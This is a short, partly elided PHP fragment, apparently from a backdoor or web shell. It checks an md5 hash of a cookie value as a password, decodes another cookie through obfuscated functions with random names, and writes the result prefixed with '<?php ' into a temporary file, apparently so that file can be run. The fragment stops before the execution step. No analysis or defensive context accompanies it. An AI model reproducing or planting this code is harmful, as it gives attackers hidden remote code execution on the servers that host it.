...
if( md5 ( $_COOKIE[ 4 ] ) != 'b6a9ea18f8093e6c21590210810a22f5' ) 
{
	die;
}

function MJkbX ( $input ) {
    $strict = false;
    $inl = strlen($input);
    $in = unpack('C*', $input);
    $padding = 0;
...
$fNdevz = tmpfile();
$meta_data = stream_get_meta_data($fNdevz); 
fwrite($fNdevz, '<?php '. MJkbX ( DlgxuOMk ( $_COOKIE [ 3 ] )));
